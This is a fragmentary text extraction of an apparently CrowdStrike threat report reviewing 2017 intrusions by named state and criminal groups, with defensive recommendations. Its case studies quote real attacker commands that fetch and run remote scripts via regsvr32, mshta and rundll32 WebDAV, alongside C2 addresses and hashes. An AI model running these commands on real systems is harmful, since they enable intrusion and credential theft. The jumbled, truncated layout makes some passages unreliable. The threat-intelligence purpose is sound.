Falcon Intelligence expects COBALT SPIDER to continue to use spear phishing
to target banks, particularly in regions where this has already proved
profitable for this adversary.

Findings Part 1

HACKTIVISM

Introduction

Large-scale, international hacktivist campaigns from Anonymous were notably
subdued in 2017. The hacktivist collective attempted to resurrect the success of
the 2016 #OpIcarus campaigns, but both the #OpDaedalus campaign in February
and the #OpSacred campaign in June fell short. The operational model for such
campaigns requires widespread support from disconnected groups, and the lack of
centralized authority within this collective has led to a more regional focus
for hacktivism in general.
Many hacktivist groups engaging in regional, geopolitically motivated
activity have modeled themselves after Anonymous. Their ideology is often
anti-government and anti-capitalist, but with a distinctive nationalist flare.
A prime example of such a group is Anonymous Greece, which targeted Greek
financial entities in September, but also defended the country against proTurkey hacktivists in July.
The government sector appears to be the most common target of hacktivist
groups expressing displeasure with the policies of a specific country. However,
media entities have also been targeted, particularly in the Middle East and
Russia/Ukraine regions. Additionally, experienced hacktivist actors such as
KalausMarcus, which appeared to be directing many of the anti-Saudi campaigns,
recognize the value of targeting the technology sector to broader effect, e.g.,
targeting an internet service provider (ISP) in order to bring down a larger
number of organizations.

2018
Outlook

Hacktivism

The growing tension of regional issues will likely continue to pull in
support from local hacktivists and regional branches of larger hacktivist
collectives such as Anonymous. Issues such as local political movements,
border and diplomatic disputes, and human rights campaigns will likely
continue to draw the support of hacktivist operations to some degree.
Common hacktivist TTPs still include DDoS attacks, defacements and
information disclosures. It is possible that with the publicity surrounding
incidents of pseudo-ransomware wipers (e.g., NotPetya, IsraBye),
hacktivist groups may adopt this TTP as a means to destroy data, or to
be a disruptive force.

Findings Part 1

CONCLUSION
Introduction

In 2018, technology companies, banks and retail institutions will remain
the targets of criminal enterprises. eCrime threats will come primarily in
the form of large botnets, botnet affiliates and targeted eCrime adversaries.
Established and well-resourced operations will continue to innovate, developing
new methods of distributing crimeware and possibly incorporating more TTPs
associated with targeted intrusion campaigns. High-profile events (such as
WannaCry in 2017) will continue to incite copycats to adopt the latest trending
TTPs in order to maximize profits.

Likewise, rising dollar values of
cryptocurrencies will also be an opportunity for
cybercriminals. CrowdStrike expects mineware
to further proliferate, as has already proven
to be the case based on data observed in
late 2017. The compromise of cryptocurrency
exchange markets, as well as individual wallets,
will be tempting as the value of Bitcoin and
other currencies increase. This trend is also
very likely to encourage additional DPRK
adversary activity, following 2017 operations
which appear to be focused on alternative
currency generation for the Kim Jong Un
regime.
Targeted intrusion adversaries will undoubtedly
be tasked with conducting campaigns as part
of regional pursuits and national strategies;
entities in the government, defense, think
tanks and NGO sectors will continue to be the
targets of these operations. For China, interest
in regional neighbors will almost certainly
continue, as well as a focus on countries that
represent technological powerhouses, such as
Japan, or potential investment opportunities for
the BRI. Russia will continue to be concerned
with Ukraine, Europe, the U.S. and NATO, but it
may also focus on issues at home in the leadup to the 2018 presidential election. Likewise,
Iran will continue to monitor domestic dissident
activity in addition to maintaining situational
awareness of its Middle East neighbors, with
added intrusions possible against the U.S.
Despite a recent lull in heightened rhetoric, the

U.S. and South Korea are likely targets for North
Korean cyber adversaries in the new year.
Falcon Intelligence assesses that adversaries
will continue to incorporate publicly available
malware. Not only are these tools easily
obtainable, but they provide OPSEC-savvy
actors with a cover for their operations. Such
tools include Empire PowerShell and Cobalt
Strike, but also commodity tools like Mimikatz
and Poison Ivy. Similarly, adversaries will use
innate “living off the land” techniques during
lateral movement to avoid detection by
conventional endpoint defenses. Advanced
groups will likely incorporate these TTPs into
increasingly inventive ways of achieving their
goals, with persistent actors trying multiple
methods to maintain or obtain access to key
networks. Supply chain attacks have proven
their value to attackers in 2017 and this trend
will likely continue unless steps are taken to
harden software update processes.
As demonstrated in 2017, actors of all types
have taken advantage of unsecured and stolen
data, leading to both high-profile attacks, and
smaller inconveniences often felt at the local
or individual level. Criminal investigations will
undoubtedly continue to lead to the arrest and
sentencing of individuals involved in these
incidents, but it will require both a heightened
cybersecurity posture and vigilance in detecting
new vulnerabilities by organizations seeking to
protect the data that matters the most.

CROWDSTRIKE

FALCON

OVERWATCH

Introduction
In the previous year, CrowdStrike Falcon® OverWatchTM identified numerous nationstate and eCrime targeted intrusions across many industry verticals. Many of the
attacks chronicled here directly support the findings of the Falcon Intelligence
team, as described in Part 1 of this report. Among the more significant trends the
OverWatch team was able to validate was an increasing rate of activity attributed
to North Korean and Iranian actors. In addition, Falcon OverWatch observed nationstate actors showing continued interest in the hospitality sector. Also notable
were multiple cases in which two or more targeted intrusion adversaries were
found exploiting a victim network concurrently. OverWatch further observed a shift
in prioritization of Russian and Chinese targeting with respect to employees of
Western think tanks. These trends are all captured below in the following yearly
summary of highlights from intrusions discovered by OverWatch in 2017.
NOTE: Falcon Overwatch follows the MITRE ATT&CKTM methodology of tracking threats. The Techniques Observed section
is labeled following that methodology and technique definitions can be found at https://attack.mitre.org/wiki/Main_Page

OverWatch Highlights from 2017

Hospitality Sector Heavily Targeted
Throughout 2017
During 2017, Falcon OverWatch continued to
see intensive targeting of the hospitality sector.
It is clear that members of this industry vertical,
particularly global hotel chains, are at continued
risk of targeted intrusion as eCrime actors seek
financial gain in exploiting hotel franchises that
must manage widely dispersed locations with
varying levels of security controls.

SPIDERs Breach Multiple Hospitality
Chains Via Third-Party Vendor
Compromise
Techniques Observed
• Privilege Escalation: Valid Accounts
• Lateral Movement: Third-Party Software,
Remote Services
• Command and Control: Exfiltration Over
Alternative Protocol
Falcon OverWatch observed multiple eCrime
threat actors employing PoS malware on the
networks of several hotel chains during the
year. In one case, simultaneous infections were
identified at two hospitality customers after
observing file writes and executions of the
following malicious binary:
FILE: C:\Windows\SysWOW64\WinSrv.exe
HASH: 869d77ffde43f3591f16cfe509f87dda11be13809e75ac30e09f1315c5a5d955
Investigation of the sample identified the PoS

malware as PoSeidon, which can scrape the
RAM of PoS terminals for credit card track
data. It has a keylogger capability that can
collect usernames and passwords. For both
hospitality victims, the malware was installed
following FTP connections to a malicious external server, located at the time at IP address
174[.]34[.]253[.]21. The FTP connections were
initiated under a legitimate remote connectivity application using the same user account,
which was associated with a third-party vendor.
CrowdStrike determined that the breach
occurred through the compromised vendor’s
access with the malicious actor installing the
malware to target parking pay stations operated
by the third party. This case highlights the risk of
outside vendor access into enterprise networks.

FANCY BEAR Phishing Targets
International Hotel Chain
Techniques Observed
• Privilege Escalation: Exploitation of Vulnerability
• Defense Evasion: Masquerading
• Command and Control
SPIDERs are not the only adversaries actively
targeting the hospitality sector. Nation-state
adversaries have also maintained a deep
interest in the sector, which may be for the
purposes of tracking persons of interest while
they are traveling, or to enable access to these
potential victims when they use equipment

outside of normal corporate networks. In July
2017, at least one international hotel chain
suffered a phishing attack from FANCY BEAR
actors. The adversary delivered a file named
Hotel_Reservation_Form.doc (SHA256 hash

The first exported function of the DLL was then

was also seen being used to launch the implant.
The domains mvband[.]net and mvtband[.]net
were configured as C2. DownRange is a firststage tool that is uniquely attributed to FANCY
BEAR. As OverWatch observed throughout 2017,
phishing remains a favored tactic to maliciously
gain access to target networks, not only among
BEAR groups, but for several nation-state actors.

Get-GPPPassword.ps1

Early in the year, OverWatch discovered
artifacts associated with the Agent ORM
implant used by CARBON SPIDER. Other likely
CARBON SPIDER artifacts observed as part
of intrusion activity included FRAMEPKG.exe
(seen with multiple hash values), a modified
version of PsExec used as utility malware.
FRAMEPKG.exe was used extensively to conduct
reconnaissance and access sensitive data
servers, including credit card databases. A
notable tactic was the use of CmdKey1 to add
more users to facilitate persistence. Likely
motivated by financial gain, OverWatch has
observed similar CARBON SPIDER activity at
several customers in the hospitality and other
vertical industries.
Over the following months, OverWatch saw
further likely CARBON SPIDER behavior on the
victim network. Malicious actors repeatedly
gained access via compromised credentials
and then installed legitimate TeamViewer

software. They used TeamViewer to not only
deploy their own implants, but also to install
legitimate Ammyy Admin and Supremo remote
desktop software. When attackers are able to
deploy legitimate remote administration tools,
they often are able to maintain a foothold within
the network without drawing the attention
that malware may trigger. Another popular
tactic noted during this set of activities was
employing the eventvwr.exe UAC bypass for
privilege escalation. 2
In July, a hotel employee opened a hotel
reservation-themed phishing lure, resulting
in an AppLocker bypass attack, which
connected to a file hosted on an external
server associated with Cobalt Strike activity.
Immediately following the bypass attack,
Excel was spawned as a service and launched
rundll32.exe, which further spawned several
malicious child processes, including basic
reconnaissance commands and PowerSploit.
Specifically, the unknown SPIDER actors
leveraged the PowerSploit Get-GPPPassword
module3 for credential theft.
In August, a KITTEN adversary directly
accessed two of the hotel chain’s servers using
existing credentials. Using a version of the
SysInternals PsExec tool to run a command
shell, the actors installed a service with the
name Microsoft Proxy Service. That service
used a custom build of the Plink Secure Shell
(SSH) client from the PuTTY suite to create a
compressed and encrypted SSH tunnel to a
subdomain of win7-update[.]com, forwarding
the remote port 3389 to 8516 on the local
host. This tunnel could then be used by the
actor to access the internal network. The
Falcon Intelligence team’s analysis of the C2
infrastructure revealed extensive overlaps with
known HELIX KITTEN implants. Furthermore,
the Plink version used in this attack was a
custom build, seen only in another HELIX
KITTEN intrusion targeting a technology sector
company focused on travel services. Such
behavior demonstrates the growing scope and

62

capability of actors assessed to be associated
with Iranian operations.
OverWatch also learned that potential FANCY BEAR actors had been active on this
victim’s network. In particular, tools used
by FANCY BEAR seen on a portion of the
customer’s network included the RemCom
remote administration tool (SHA256 3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71). Though RemCom
is a known open-source remote command

63

execution tool that can by used by network
administrators, CrowdStrike has repeatedly
seen FANCY BEAR employ it in other targeted
intrusions. In this case, the victim confirmed
that RemCom was not being used by legitimate administrators, but by probable FANCY
BEAR actors within their network. FANCY BEAR
presence on the network would be consistent
with their suspected interests as noted above,
specifically global hotel organizations that
represent a valuable target to facilitate tracking
and monitoring of people of interest.

Intrusion Campaign

In June 2017, OverWatch uncovered an intrusion
campaign targeting the legal sector. The
malicious activity began with the exploitation
of vulnerable or misconfigured Microsoft SQL
servers, which were used as staging points for
malicious command execution. After conducting
basic reconnaissance with commands such
as whoami and ipconfig, the actors used
PowerShell to download and run a file from the
code hosting service GitHub. This payload was a
first-stage, open-source backdoor known as the
PowerShell-GitHub-Shell,5 which functions as a
remote shell, receiving tasking and submitting
the output back to a GitHub page.

https://technet.

en-us/library/

In at least one case, the adversary later used
the initial backdoor to install and deploy a
second-stage implant, HanaRAT, from IP address
80.83.118[.]248. The associated install files
were initially downloaded as .txt files and then
converted to .exe and .dll files using certutil.6
The actors were also intent on cleaning up
afterwards, deleting all .txt, .exe and .dll files
from their staging directory (%TEMP%).

The identified copy of HanaRAT was deployed
from a dropper named mpsvc.dll
(SHA256 hash: a144825a4aa74a50f9e8dcb7eab0e5dfa1f708471d8bc097f08e683c50fd3738)
that was side-loaded by a legitimate copy of a
Microsoft Malware Protection executable named
MsMpEng.exe (SHA256 hash: 11f55350ef5219b132a1e04c8bf8a521089f62d7207d40f7f3c6e8b6e04090a1). The core HanaRAT malware
(SHA256 hash:
5dcf3080a9268c7c846430b313c1e9f4fd9caf80c0fbaefb9ef562bd9014b220) exists only in
memory after being initialized by the dropper.

Partnership between the Falcon Intelligence
and OverWatch teams revealed this same
malicious behavior impacting at least eight
victims in the legal services sector. The identified
targets were primarily headquartered in the U.S.,
although many maintain international offices, as
well. The use of GitHub as a first-stage control
infrastructure is a tactic observed among
multiple tracked adversaries, as it provides the
actor with an initial layer of operational security
and obfuscation. The observed behavior led
Falcon Intelligence to assess this series of
attacks against the legal sector as a continuation
of a campaign initially targeting technology
sector entities. Based on initial attribution of the
aforementioned campaign, the actor conducting
this attack is suspected of being supported by
WICKED PANDA.

Growing Tensions Between U.S.,
DPRK Coincide with Higher Rate
of CHOLLIMA Activity
Techniques Observed
• Persistence: New Service
• Defense Evasion: Masquerading
• Discovery: System Information Discovery,
System Network Configuration Discovery,
File and Directory Discovery
• Command and Control
Consistent with reporting trends across the
community, OverWatch saw an increase in
threat activity attributed to North Korea in 2017.
For example, in mid-May, STARDUST CHOLLIMA
actors exploited a web-facing SMB server
belonging to a high-profile research institution
located in the U.S. They leveraged access to
install the following malicious DLL:
FILE: C:\Windows\System32\sqlsvc32.dll
HASH: c18f39829759ffd0f51fb2224a57469e16e7bb542ec31ab94be1cf8222f7a23d
The DLL is an implant that was executed with
the following command line to run as a service:
C:\Windows\system32\svchost.exe -k SQLMgnt
C2 communications were observed, IP
address 220.241.29[.]138 and the domain
onlineshoppingmole[.]epac[.]to. The malware
is a variant of TwoPence’s XorDNS component.
TwoPence is an implant framework that includes
components taken from a shared source code
repository known to be leveraged by STARDUST
CHOLLIMA, assessed as a state-sponsored
North Korean adversary focused on financiallymotivated eCrime. The DNS XOR component
itself has been used in previous actor tools
of varying types, including keyloggers and
RDP brute-forcing tools. CrowdStrike has only
observed STARDUST CHOLLIMA use the
TwoPence malware family.
In August, OverWatch identified a spearphishing attack targeting English-speaking
users in the Asia-Pacific region using a
malicious, macro-enabled document named
Job Description.doc. When the victim opened

65

the malicious Word attachment, it dropped an
English-language decoy document containing
job description text for a “Director of Compliance
Management” role. In addition to the decoy
document, the following implant file was written
to disk and executed:
File: C:\Users\<REDACTED>\AppData\Local\
Temp\csc.exe
Hash: a4a2e47161bbf5f6c1d5b1b3fba26a19dbfcdcf4eb575b56bde05c674089ae95
Falcon Intelligence identified the file as a Hawup
RAT binary attributed to LABYRINTH CHOLLIMA,
an adversary believed to conduct espionage
operations in support of DPRK intelligence
requirements. Once executed, the RAT called
out to the following C2 IP addresses waiting for
a response:
64.86.34[.]24
41.131.29[.]59
176.35.250[.]93
After lying dormant for almost three full days,
the adversary answered the call and ran an initial
“ver” command. This is often seen as the first
command actors execute after gaining access
to an exploited machine, as it gives information
on the running operating system. The malware
was then copied to the startup folder as dwm.
exe for persistence. OverWatch then observed
additional reconnaissance commands, including
ipconfig, net user, net use, and dir. At that point,
the victim responded by quarantining the host,
preventing further adversary actions on the
compromised machine.
The content of the decoy document appeared
to be taken from a legitimate job description
posting. This activity aligned with concurrent
industry reporting on an ongoing campaign by
DPRK actors leveraging English-language Word
documents purporting to be job descriptions for
U.S. defense contractors. Given the job-related
lure themes, this targeting likely was part of a
specific focus on targeting contractors working
in the Asia-Pacific region.

Suspected KITTEN Attacks
Target Middle East Organizations
Techniques Observed
• Privilege Escalation: Exploitation of
Vulnerability
• Credential Access: Input Capture
• Execution: Rundll32
• Command and Control
Similar to the increase in CHOLLIMA attacks in
2017, OverWatch also identified more suspected
KITTEN adversary attacks during the year. In July,
an employee at a Middle East petrochemical
company was targeted by a spear-phishing email
containing a malicious link to the following URL.
http://vpsupdate[.]tk/list[.]zip
Thanks to the Falcon sensor running on the
victim’s host, the malware did not successfully
infect the host. The tactics and target in this
event were consistent with KITTEN behavior.
The malicious link at the time was hosted at IP
address 51.255.24[.]88. According to Falcon
Intelligence, that IP address is known to be HELIX
KITTEN infrastructure, used before as C2 for their
Helminth implant.
Later, in September, OverWatch observed a
strategic web compromise (SWC) impact several
victims in a wide range of industry verticals.
The Saudi Heart Association website (ksacpr.
org[.]sa) was compromised to redirect visitors
to the malicious domain adobe-plugin[.]bid,
then hosted at IP address 188.165.187[.]235.
Redirected victims would automatically attempt
to remotely authenticate to the adversarycontrolled external server’s SMB share.
Falcon data showed that communication to the
malicious infrastructure resulted in activity very
similar to what was observed during an SWC
operation targeting North American energy
and critical infrastructure sectors earlier in
2017. Commands observed in that attack were
formatted as follows:
rundll32.exe C:\WINDOWS\system32\
davclnt.dll,DavSetCookie 184.154.150[.]66
http://184.154.150[.]66/ame_icon.png

In the Saudi Heart Association attack,
observed commands connecting to adversary
infrastructure were highly similar. For example:
rundll32.exe C:\WINDOWS\system32\
davclnt.dll,DavSetCookie 188.165.187[.]235
http://188.165.187[.]235/file.gif
These types of connections could potentially
expose internal NTLM hashes to the attacker for
collection, and potential offline cracking for future
reuse. Falcon Intelligence attributed the SWC
activity affecting energy and critical infrastructure
organizations to the Russia-based actor BERSERK
BEAR. However, the SWC campaign related
to the Saudi Heart Association website has
suspected links to KITTEN actors, as the target
set would be consistent with Iranian interests.

OverWatch identified PANDA adversaries
exploiting telecommunications companies in
Southeast Asia throughout 2017. In one such
intrusion, OverWatch discovered that actors had
compromised an internal Linux host and were
using it as their primary staging point for hosting
a wide array of malicious tools to enable further
penetration throughout the victim’s network.
Observed activity on the machine included telnet
checks to allow SMB, RDP, SSH and TCP port
5050 listening on multiple internal IPs. They used
curl to download from, or test connectivity with,
victim web hosts. A re-compiled version of the
port scanner Pscan was used against multiple

During one of the malicious SSH sessions,
OverWatch saw the installation of a service
named hci0 from a RPM package. Further
investigation revealed it to be a build of the
open-source xsocks proxy server.8 Additional
analysis of the compromised Linux host also
discovered daily scripted routing to harvest
data from a customer database. Exfiltrated
data included SMS and call data records,
facilitated by use of a tool named sxx, which was
a re-compiled open-source SSH tunneler.9 An
example of the command line used to perform
the data harvesting is provided here:

across the network demonstrates how deeply
this adversary had embedded itself within
the victim network, and serves as a warning
to the telecommunications sector regarding
China’s prioritization of targeting their industry,

PANDAs Increase Their Targeting of
Western Policy-Focused NGOs
During 2016, OverWatch observed BEAR
adversaries targeting several U.S. think tanks
and NGOs focusing on public policy. Their
operational tempo dramatically increased as that
year progressed. OverWatch identified at least
twelve separate campaigns — from late August
through the end of 2016 — aligning with likely
Russian government intentions to influence the
U.S. presidential elections that autumn. Since
President Trump assumed office in early 2017,
OverWatch has seen a reduction in the rate of
BEAR targeting against think tanks and policy
organizations. CrowdStrike assesses that the
decrease in activity could be the result of a
shift in Russian priorities and focus after the
U.S. presidential election ended. It could also
represent a temporary pause in targeting think
tanks, in order to reevaluate their influence
strategies following the highly public exposure
of Russian interference in Western elections.
While BEAR activity against U.S. think tanks
declined in 2017, OverWatch observed an
increase in the rate of PANDAs targeting
Western think tanks and other policy-oriented
NGOs in comparison to the previous year. A
summary of these PANDA intrusions in 2017 is
provided in the following chart.

In the spring of 2017, PANDA actors sent
two separate spear-phishing messages to
a Mongolia-based activist working for an
NGO that promotes global democracy. The
phishes were sent to the victim’s personal
email account, but were opened on his work

Source:
CrowdStrike Falcon OverWatch

laptop. The first message included a malicious
attachment titled CV.doc. When opened, the
file exploited a known application whitelisting
bypass technique that uses the regsvr32 utility
to request and execute a script from a remote
server. In this case, it did so using the following
command:
regsvr32.exe /u /s /i:http://www.geocities[.]
jp/bqwfvh9/cv0309.sct scrobj.dll
The customer chose not to take immediate
containment actions and over the next half
hour, OverWatch observed execution of the
PowerShell Empire post-exploitation agent as
well as Poison Ivy, which was side-loaded via a
legitimate Symantec binary:
File: C:\Program Files (x86)\Common Files\
SymantecProtect\ldvpreg.exe
Hash: 61d1943f0b702f4c16bb37228ade1d8f0ef4675b480921950d026c82e4a65fde

68

Actions on objectives prior to initiation of
remediation were limited, consisting primarily
of using the legitimate attrib.exe10 tool to hide
evidence of malicious files. Also notable in
the attack was the use of C2 infrastructure
attempting to replicate legitimate domains,
including microsoftwinword[.]com and www.
applenetsuppprt[.]com .
The second spear-phishing message, opened
two days later, used a lure of Interview_
outline.zip. When unzipped, a LNK file was
written. The user clicked the LNK file, which
was set to launch mshta.exe using an unusual
technique that runs a VBScript command
directly from the mshta command line:
"C:\Windows\System32\mshta.exe" vbscript:Execute("dim result:result=GetObject
(""script:http://www.geocities[.]jp/bqwfvh9/
[REDACTED].wsc"")(window.close)")
The same geocities[.]jp URL was used in the
first phishing attack, but in this case, the called
script was named after the victimized user,
indicating that the adversary knew precisely
who they were targeting. Subsequent activity
on the host during the next 10 minutes involved
PowerShell Empire commands and hiding files
as before, but interactive commands were more
extensive. The actor conducted reconnaissance
using netstat, net user, net view and ipconfig
commands. Additional tools were staged in the
following paths:
C:\ProgramData\
C:\ProgramData\Adobe\
C:\Intel\Logs\
These tools included signed, legitimate
Symantec binaries for PlugX side-loading, and
a tool used to establish and update persistence
scripts, as well as at least five PowerShell and
Visual Basic scripts. These scripts collected the

69

operating system version, computer name and
username, and set up periodic beaconing of this
information to three hardcoded C2 channels:

Multiple Western Think Tanks
and Asian Telecom Provider

This occurred less than a week after the
Mangzamel implant was installed on the think
tank networks.

104.203.108.94
service[.]microdownloadcenter[.]com
service[.]read-books[.]org

Techniques Observed
• Defense Evasion: DLL Side-Loading
• Command and Control

The adversary also established two persistence
mechanisms. The script ctfmon.vbs was
written and scheduled to run by the created
task Security Notify Script, which uses
PowerShell and svchost.exe to beacon to
the Korea-based IP address 27.255.92[.]251.
Another script, consvc.vbs, launched the
similarly named executable consvc.exe, which
established network connections to the Chinabased IP address 192.74.252[.]6 over port 4001.
The consvc.exe executable had been seen in
a previous intrusion into this NGOs network
environment, indicating this PANDA adversary’s
likely long-term and persistent interest in the
victim organization.

Beginning early in 2017 and continuing through
much of the year, Falcon OverWatch identified
repeated and continued PANDA targeting of
Western think tanks. Malicious tools employed
in the attacks included those commonly used by
PANDA adversaries: PlugX, Poison Ivy, Trochilus,
Mimikatz, and the Chopper webshell. The PlugX
activity involved the use of legitimate binaries to
maliciously side-load the PlugX DLL. One such
legitimate file used in the attacks was a
McAfee binary:

In the telecom victim’s network, the C2 was used
for the Trochilus RAT. As noted, this PANDA actor
used Trochilus against at least one of their think
tank targets as well. In each environment, the
Trochilus RAT leveraged svchost.exe to load a
unique DLL with various hashes and using the
following file name:

Almost two months later, the same PANDA
adversary conducted another similar spearphishing attack against the victim NGO. In this
case, the lure was titled 5_STATEMENT.doc
and was sent to a different user, who was also
based in Mongolia. As before, the message
was sent to the victim’s personal email, but
was opened on his work laptop. When opened,
CVE-2017-0199 was leveraged to download
http://61.97.250[.]54/download/7.gif. The
file 7.gif was an HTA (HTML Application) for
Windows that contained an encoded VBScript
, which in turn executed an obfuscated
PowerShell script. The malicious PowerShell
process connected to the same geocities[.]jp
domain seen previously. The C2 infrastructure
used in this attack had previously been used
with PlugX and Poison Ivy, and potentially
FlagDownloaderRAT as well, further suggesting
Chinese actor involvement.

FILE: C:\\ProgramData\SamSungHelp\
mcoemcpy.exe
In late 2017, OverWatch noticed a change in
tactics when the adversary installed Mangzamel
malware on one of the think tank victim’s
networks. One day later, the same behavior
was observed at a second such think tank. C2
infrastructure used in these attacks included IP
address assigned to a hosting provider in Hong
Kong. This IP was used for C2 in the previously
mentioned PlugX activity as well. Of particular
interest was the discovery that this C2 node
was used similarly in targeted attacks against a
southeast Asian telecommunications company.

Based on common C2 infrastructure and
overlapping TTPs, Falcon Intelligence has high
confidence that the behavior observed at these
think tanks are attributable to the same PANDA
actor. The adversary’s targeting of victims in
separate geographic regions and industry
verticals, as well as their reuse of infrastructure
and tools, continue to demonstrate China’s
pervasive and brash attempts to use network
attacks in support of national interests.

The following section provides numerical and statistical
support for many of the findings previously stated in this

The chart above depicts Falcon telemetry in
terms of major operating system coverage.

Dwell Time and Breakout Time
As most security professionals are aware,
dwell time is the period between when a
malicious attack enters your network and when
it is discovered. The longer the dwell time,
the greater the potential for damage. In the
"CrowdStrike Cyber Intrusion Services Casebook
2017," the CrowdStrike Services team reported
the average attacker dwell time recorded by
CrowdStrike incident responders during field
investigations conducted in 2017 was 86 days.

in customers’ environments.

The importance of collecting this amount of
telemetry isn’t simply about amassing the
security industry’s biggest data store, but
how effectively that information is being used.
For example, Threat Graph telemetry is used
by Falcon OverWatch, CrowdStrike’s team of
proactive threat hunters that uses the data to
identify, investigate and advise on threat activity

The graph in Figure 12 is a sample of how Threat
Graph data is used to generate hunting leads,
which OverWatch analysts sift and review to
determine whether the identified behavior
is malicious or intrusion-related activity. The
“needle in a haystack” analogy is an apt one here:
Adversaries are clever in their use of legitimate
system resources to mask their behavior, so the
majority of sifted data tends to be benign.

A related statistic that CrowdStrike calls
"breakout time" describes lateral movement
speed and refers to how quickly after
penetrating your network the attacker moves

on to other other systems, typically in search
of additional data, systems and intellectual
property to compromise.
For 2017, CrowdStrike observed that breakout
time was an average of 1 hour and 58 minutes.
That's the average time for an intruder to
begin moving laterally to other systems in the
network. There are many methods to slow
down attackers and make their attempts at
lateral movement more visible. These include
limiting user account permissions, application
whitelisting, segregating users and neworks,
and aggressively applying available patches.

Antivirus Effectiveness
Another interesting trend observed in 2017 was
an increase in malware-based versus malwarefree attacks. This doesn’t necessarily indicate
an increase in new malware attacks. Instead, it
highlights what CrowdStrike has observed with
newly onboarded Falcon platform customers:
the prevalence of malware — even when
traditional antivirus products are present —
still exceeds malware-free attacks upon initial

implementation. Over time and after remediation,
this dynamic begins to shift.
Figure 13 below compares malware-based and
malware-free attacks from the Threat Graph
telemetry. The attack types are defined as
follows:
• Malware attacks: These are simple use cases
where a malicious file is written to disk and

74

Falcon detects the attempt to run that file,
then either blocks it or alerts the security
team to take further action.
• Malware-free attacks: CrowdStrike defines
malware-free attacks as those in which

include attacks where code executes from

growing effectiveness of machine learning

different aspects of malicious executables,
rather than traditional approaches using only

file attributes. This is illustrated by another

majority of cases recorded in 2017, CrowdStrike
Falcon’s ML capabilities detected malicious
software seven days before other traditional AV
products, while offering coverage for 43% more
malicious software.

This is a defining point in evolving from a
traditional signature-based security approach
to one that is truly “next-gen.” Gone are the
days where tracking and naming common
threat malware helped identify and remediate
attacks. Today’s defensive methodology
includes understanding the behavior of the
malware and preventing it from executing
as quickly as possible. The shift in defense
strategy is necessary to address changing
attacker techniques, such as the pivot toward
fileless and malware-free attacks. For example,
threat actors such as INDRIK SPIDER have
used the Emotet downloader (developed and

operated by MUMMY SPIDER) to distribute the
Dridex malware, such as TrickBot and QakBot.
CrowdStrike employs a strong combination of
machine learning and behavioral indicators of
attack (IOAs) within the Falcon EPP platform to
combat this type of threat.
Blended threats such as Emotet indicate how
the line between malware versus malware-free
techniques has blurred. While eCrime actors
continue to develop more advanced forms of
malware, CrowdStrike assesses that malwarefree attacks will continue to be a dominant
technique in 2018 and beyond.

RECOMMENDATIONS
Based on the findings contained in this report,
CrowdStrike recommends the following
measures:

1. Going Beyond Malware:
Strengthen Defenses Against
Modern Attacks
As sophisticated attacks continue to evolve,
enterprises face much more than just “a
malware problem.” Defenders must look for
early warning signs that an attack may be
underway, such as code execution, persistence,
stealth, command control and lateral
movement within a network. When delivered
in real time via machine learning and artificial
intelligence, this contextual and behavioral
analysis detects and prevents attacks that
conventional defense-in-depth technologies
cannot address.

2. Continually Assess Risk
with Real-Time Visibility
According to the NIST Cybersecurity
Framework, maintaining up-to-date inventories
of devices and applications on your network
are the top two priorities for establishing
critical security controls. Understanding what
is running in the corporate network enables
companies to identify vulnerable systems that
require critical security updates and patches. In
addition, understanding the systems that user
accounts can access and the permissions they
possess is critical in stopping initial intrusions
and lateral movement. Take control of account
privilege levels and protect unauthorized
network and application access with two-factor
authentication.

3. Add Threat Hunting to Your
Security Portfolio
Passively waiting for traditional security
countermeasures to detect attacks is not
enough. Proactive threat hunting, led by human
security experts, is a requirement for any
organization looking to achieve or improve realtime threat detection and incident response.

4. Integrate Threat Intelligence Into
Your Endpoint Security Strategy
The more intelligence a security team obtains
on who might be targeting its organization
and how the actors operate, the more
educated, aware and effective that security
team becomes. Understanding whether
your organization is a potential target for an
adversary, and knowing which exploits and
strategies are commonly used in such attacks,
can help you prioritize patching and eliminate
vulnerabilities before the adversary can initiate
an attack.

5. Assess Your Readiness to Protect
Against Sophisticated Attacks
Evaluate the quality and effectiveness of your
security program before an attack happens.
Engaging in third-party security assessments
will reveal organizational readiness to face both
common and sophisticated attacks. In addition,
participating in adversary emulation exercises,
using real-world TTPs, will inform you about
how to improve your incident response
playbook and procedures.
